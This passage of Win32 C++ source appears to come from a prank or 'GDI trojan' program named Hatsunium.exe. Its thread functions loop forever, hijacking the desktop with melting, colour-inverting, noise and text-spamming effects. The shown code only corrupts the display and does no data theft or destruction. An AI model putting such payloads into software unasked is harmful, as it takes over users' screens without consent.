	Polygon(hdc, polyline2, 4);
	SelectObject(hdc, CreateSolidBrush(RGB(0, 255, 0)));
	Polygon(hdc, polyline3, 4);
	SelectObject(hdc, CreateSolidBrush(RGB(255, 0, 255)));
	Polygon(hdc, polyline4, 4);
	SelectObject(hdc, CreateSolidBrush(RGB(0, 0, 255)));
	Polygon(hdc, polyline5, 4);
	SelectObject(hdc, CreateSolidBrush(RGB(255, 255, 0)));
	Polygon(hdc, polyline6, 4);
	DeleteObject;*/
	POINT polyline1[4] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3] };
	HPEN pen = CreatePen(PS_SOLID, NULL, NULL);
	HBRUSH brush = CreateSolidBrush(RGB(0, 255, 255));
	SelectObject(hdc, pen);
	SelectObject(hdc, brush);
	Polygon(hdc, polyline1, 4);
	DeleteObject(pen);
	DeleteObject(brush);
	/*POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};*/
	/*Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);*/
}

DWORD WINAPI cube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	float x2 = 100.0;
	float y2 = 100.0;
	float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	for (;;) {
		hdc = GetDC(0);

		x2 += incrementor * signX;
		y2 += incrementor * signY;

		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1;
			x2 = 76;
		}

		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1;
			y2 = 76;
		}


		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 1, RGB(255, 255, 255));
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;

		Sleep(10);

		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}

DWORD WINAPI text2(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	LPCWSTR lpText = L"Hatsunium.exe";
	HDC hdc = GetWindowDC(hwnd);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	srand(time(0));
	while (1) {
		for (int x = 0; x <= w; x += 186) {
			for (int y = 0; y <= h; y += 64) {
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, x * wdpi / 96, y * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, (x + 93) * wdpi / 96, y * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, x * wdpi / 96, (y + 16) * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, (x + 93) * wdpi / 96, (y + 16) * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, x * wdpi / 96, (y + 32) * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, (x + 93) * wdpi / 96, (y + 32) * hdpi / 96, lpText, wcslen(lpText));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, x * wdpi / 96, (y + 48) * hdpi / 96, lpText, wcslen(lpText));
				SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				SetBkColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
				TextOutW(hdc, (x + 93) * wdpi / 96, (y + 48) * hdpi / 96, lpText, wcslen(lpText));
				Sleep(1);
			}
		}
	}
	return 0;
}

DWORD WINAPI shader3(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((x & (i * 4)) * (y | (i * 4)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI last(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, -2, 2, w, h, hdcMem, 4, 4, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	return 0;
}

VOID WINAPI ci(HDC hdc, HDC hcdc, int x, int y, int w, int h)
{
	HRGN hrgn = CreateEllipticRgn(x, y, x + w, y + h);
	SelectClipRgn(hcdc, hrgn);
	HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
	SelectObject(hcdc, hBrush);
	Rectangle(hcdc, x, y, w + x, h + y);
	DeleteObject(hrgn);
	DeleteObject(hBrush);
}

DWORD WINAPI transparent(LPVOID lpParam) {
	double angle = 0; int a = 11;
	for (int t = 0;; t++) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int b = rand() % a;
		const int size = b * 100 * wdpi / 96;
		int w1 = GetSystemMetrics(SM_CXSCREEN) - (b * 50 * wdpi / 96), h1 = GetSystemMetrics(SM_CYSCREEN) - (b * 50 * hdpi / 96);
		int x = rand() % (w1 + size) - size / 2, y = rand() % (h1 + size) - size / 2;
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BLENDFUNCTION blur = { AC_SRC_OVER, 0, 64, 0 };
		for (int i = 0; i < size; i += (100 * wdpi / 96)) {
			ci(hdc, hcdc, x - i / 2, y - i / 2, i, i);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(10);
		}
		//GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	srand(time(NULL));
	for (int i = 0;; ++i) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = (x | y) + (i * 8);
				BYTE fractalGreen = (x & y) * (i * 8);
				BYTE fractalBlue = (x ^ y) ^ (i * 8);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * originalRed + 0.5 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * originalGreen + 0.5 * fractalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 0.5 * fractalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.8);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.8));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.8);
				pBits[index].rgbRed = static_cast<BYTE>(0.3 * fractalBlue + 0.6 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.3 * fractalRed + 0.6 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.3 * fractalGreen + 0.6 * fractalRed);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI silie2(LPVOID lpParam) {
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	for (;;) {
		HDC hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		int rx = rand() % sw;
		int ry = rand() % sh;
		BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, 0x1900ac010e);
		BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, 0x1900ac010e);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI silie(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < h; i += 20) {
			StretchBlt(hcdc, rand() % 20, i, w, 20, hcdc, rand() % 20, i, w, 20, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, NOTSRCCOPY);
		}
		for (int x = 0; x < w; x += 20) {
			StretchBlt(hcdc, x, -5 + rand() % 11, 20, h, hcdc, x, 0, 20, h, NOTSRCCOPY);
		}
		for (float i = 0; i < w; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, NOTSRCCOPY);
			angle += M_PI / 40;
		}
		for (float i = 0; i < h; i += 0.99f) {
			int a = cos(angle) * 24;
			BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, NOTSRCCOPY);
			angle += M_PI / 40;
		}
		GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int pertcangfiy = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		pertcangfiy = 5 + pertcangfiy;
		BitBlt(hdcMem, pertcangfiy, 0, w, h, hdcScreen, 0, 0, BLACKNESS);
		for (INT i = 0; i < w * h; i++) {
			int randPixel = rand() % w;
			int tempR = GetRValue(rgbScreen[i].rgb), tempG = GetGValue(rgbScreen[i].rgb), tempB = GetBValue(rgbScreen[i].rgb);
			int color = RGB(tempB, tempG, tempR);
			INT x = i / w, y = i % w;
			int Xii = x | x;
			int Yii = y | y;
			rgbScreen[i].r = x | y;
			rgbScreen[i].g = Xii - Yii;
			rgbScreen[i].b = color | color;
			rgbScreen[randPixel].rgb = RGB(tempR, tempG, tempB);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w + 160, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w - w + 160, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int pertcangfiy = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		pertcangfiy = pertcangfiy - 5;
		BitBlt(hdcMem, pertcangfiy, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r = y;
			rgbScreen[i].g = y;
			rgbScreen[i].b = x;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy + w - 160, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy + w + w - 160, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		if ((rand() % 100 + 1) % 67 == 0) pertcangfiy = 0;
	}
}

DWORD WINAPI melt(LPVOID lpParam)
{
	for (;;)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI melt2(LPVOID lpParam)
{
	for (;;)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCINVERT | NOTSRCCOPY);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
}

DWORD WINAPI melt3(LPVOID lpParam)
{
	for (;;)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCAND | SRCINVERT);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
}

DWORD WINAPI transparent2(LPVOID lpParam) {
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 64, 0 };
	for (;;) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int kun = 0; kun < 5; kun++) {
			int x = rand() % w, y = rand() % h;
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(hcdc, hBrush);
			BitBlt(hcdc, x, y, 128, 128, hcdc, x, y, PATINVERT);
			DeleteObject(hBrush);
		}
		GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1);
	}
}

VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
	if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
	DeleteDC(hdc2);
	DeleteObject(screenshot);
}

DWORD WINAPI ttrraaiinn(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	for (;;) {
		for (int angle = 0; angle < 720; angle++) {
			int x = (-100) * cos(angle * M_PI / 180.F), y = (-100) * sin(angle * M_PI / 180.F);
			hdc = GetDC(0);
			train(hdc, w, h, x, y, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(1);
		}
	}
}

DWORD WINAPI fastmove(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hcdc, 0, 0, w / 10 * 9, h, hcdc, w / 10, 0, SRCCOPY);
		BitBlt(hcdc, w / 10 * 9, 0, w / 10, h, hcdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(10);
	}
}

DWORD WINAPI anything(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		BYTE bbyyttee[3] = { PT_MOVETO ,PT_LINETO ,PT_BEZIERTO };
		INT iinntt[7] = { 2,3,4,5,6,7,8 };
		DWORD ddwwoorrdd[7] = { 2,3,4,5,6,7,8 };
		BOOL Function[16] = {
			AngleArc(hdc,rand() % w,rand() % h,rand() % ((w + h) / 2),rand() % 360,rand() % 360),
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			Ellipse(hdc,rand() % w,rand() % h,rand() % w,rand() % h) ,
			LineTo(hdc,rand() % w,rand() % h),
			Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			PolyBezier(hdc,point,rand() % 8),
			PolyBezierTo(hdc,point,rand() % 8),
			PolyDraw(hdc,point,bbyyttee,rand() % 8),
			Polygon(hdc,point,rand() % 8),
			Polyline(hdc,point,rand() % 8),
			PolylineTo(hdc,point,rand() % 8),
			PolyPolygon(hdc,point,iinntt,rand() % 8),
			PolyPolyline(hdc,point,ddwwoorrdd,rand() % 8),
			Rectangle(hdc,rand() % w,rand() % h,rand() % w,rand() % h),
		};
		SelectObject(hdc, CreatePen(PS_SOLID, rand() % 9, RGB(rand() % 256, rand() % 256, rand() % 256)));
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		Function[rand() % 16];
		DeleteObject;
		//ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	return 0;
}

DWORD WINAPI drawmikuicon(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(3 + rand() % 13)), 128 * wdpi / 96, 128 * hdpi / 96, NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}

DWORD WINAPI anyblt(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetWindowDC(0);
	for (;;) {
		DWORD ROP[12] = { SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE,MERGECOPY,MERGEPAINT,PATPAINT,PATINVERT,DSTINVERT };
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		//ReleaseDC(NULL,hdc);
		DeleteObject;
		Sleep(50);
	}
}

DWORD WINAPI anyblt2(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		POINT point[3];
		point[0].x = rand() % w, point[0].y = rand() % h;
		point[1].x = rand() % w, point[1].y = rand() % h;
		point[2].x = rand() % w, point[2].y = rand() % h;
		PlgBlt(hdc, point, hdc, rand() % w, rand() % h, rand() % w, rand() % h, NULL, 0, 0);
		DeleteObject(point);
		//ReleaseDC(NULL, hdc);
		Sleep(50);
	}
}

DWORD WINAPI fastdown(LPVOID lpParam) {
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	srand(time(NULL));
	for (;;)
	{
		int randx = rand() % w;
		int randw = (rand() % w / 4);
		HDC hdc = GetDC(0);
		StretchBlt(hdc, randx, rand() % 20, randw, h, hdc, randx, 0, randw, h, SRCCOPY);
		ReleaseDC(0, hdc);
		randx = rand() % w;
		randw = (rand() % w / 4);
		hdc = GetDC(0);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, hBrush);
